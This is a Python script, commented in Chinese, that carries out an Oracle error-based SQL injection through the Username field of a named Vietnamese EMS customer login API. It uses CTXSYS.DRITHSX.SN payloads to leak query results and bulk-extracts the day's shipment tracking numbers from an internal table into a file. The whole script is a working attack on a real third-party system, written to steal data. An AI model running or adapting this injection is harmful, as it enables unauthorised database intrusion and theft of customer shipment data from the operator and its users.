#!/usr/bin/env python3
"""
自动提取当天所有EMS运单号
使用方法: python3 export_today_all.py
输出: tracking_YYYYMMDD.txt（每行一个运单号）
"""

import requests
import json
import time
from datetime import datetime

target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"

def inject(payload):
    session = requests.Session()
    session.headers.update({
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    })
    data = {"Username": payload, "Password": "test"}
    try:
        return session.post(target_url, data=json.dumps(data), timeout=30)
    except:
        return None

def extract(query):
    payload = (
        f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
        f"1325=CTXSYS.DRITHSX.SN(1325,"
        f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
        f"({query})||"
        f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
    )
    
    response = inject(payload)
    if response:
        text = response.text
        try:
            if 'qjvjq' in text and 'qkvzq' in text:
                start = text.index('qjvjq') + 5
                end = text.index('qkvzq', start)
                return text[start:end]
        except:
            pass
    return None

print("=" * 80)
print("📦 自动提取当天所有EMS运单号")
print("=" * 80)

# 1. 连接
print("\n🔌 连接中...")
if not inject("admin"):
    print("❌ 失败")
    exit(1)
print("✅ 成功")

# 2. 获取当前日期
date = extract("SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL")
current_time = extract("SELECT TO_CHAR(SYSDATE,'HH24:MI:SS') FROM DUAL")
print(f"\n📅 日期: {date}")
print(f"⏰ 时间: {current_time}")

# 3. 统计数量
print(f"\n📊 统计运单号数量...")
total = extract(f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN'")

if not total or total == '0':
    print(f"❌ 今天没有数据")
    exit(1)

total_num = int(total)
print(f"✅ 找到 {total_num} 个EMS运单号（去重后）")

# 4. 询问是否继续
print(f"\n⏱️  预计耗时: {total_num * 0.1 / 60:.1f} 分钟")
print(f"💾 输出文件: tracking_{date}.txt")
print(f"\n开始导出...")

# 5. 批量提取
tracking_list = []
start_time = time.time()

for i in range(1, total_num + 1):
    # 显示进度
    if i % 100 == 0 or i == 1:
        elapsed = time.time() - start_time
        if i > 1:
            avg_time = elapsed / (i - 1)
            remaining = (total_num - i) * avg_time
            print(f"\r  进度: {i}/{total_num} ({i*100//total_num}%) - 剩余约 {remaining/60:.1f} 分钟", end='', flush=True)
        else:
            print(f"\r  进度: {i}/{total_num} (0%)", end='', flush=True)
    
    # 提取运单号
    query = f"SELECT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{date}' AND ITEMCODE LIKE 'E%VN' ORDER BY ITEMCODE) WHERE ROWNUM={i}"
    result = extract(query)
    
    if result and result != 'NULL' and len(result) > 10:
        tracking_list.append(result.strip())
    
    # 控制速度
    time.sleep(0.1)

print()  # 换行

# 6. 保存文件
output_file = f'tracking_{date}.txt'

with open(output_file, 'w', encoding='utf-8') as f:
    for tracking in tracking_list:
        f.write(tracking + '\n')

# 7. 统计结果
elapsed_total = time.time() - start_time

print(f"\n✅ 导出完成！")
print(f"📁 文件: {output_file}")
print(f"📊 数量: {len(tracking_list)} 个")
print(f"⏱️  用时: {elapsed_total/60:.1f} 分钟")

# 8. 显示前20个和最后10个
print(f"\n前20个运单号:")
for i, t in enumerate(tracking_list[:20], 1):
    print(f"  {i}. {t}")

if len(tracking_list) > 20:
    print(f"\n最后10个运单号:")
    for i, t in enumerate(tracking_list[-10:], len(tracking_list)-9):
        print(f"  {i}. {t}")

print("\n" + "=" * 80)
print("✅ 完成！")
print("=" * 80)
